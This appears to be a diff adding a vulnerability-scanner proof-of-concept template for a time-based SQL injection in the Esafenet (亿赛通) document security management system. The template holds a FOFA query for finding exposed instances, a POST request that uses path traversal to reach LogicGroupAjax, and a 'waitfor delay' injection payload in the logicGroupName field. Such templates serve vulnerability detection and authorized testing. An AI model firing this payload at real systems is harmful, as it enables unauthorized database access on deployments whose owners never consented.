@@ -1,0 +1,20 @@
+id: poc-yaml-yisaitong-esafenet-logicgroupajax-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 LogicGroupAjax SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 亿赛通电子文档安全管理系统
+  fofa: app="亿赛通-电子文档安全管理系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /CDGServer3/js/../LogicGroupAjax
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: command=isExist&logicGroupName=-1'waitfor delay '0:0:{{.t1}}'--
+  expression: status_code == 200 && contains(headers,"CDGServer3") && body == "false"
+    && duration > t1 && duration < t2
+transport: http
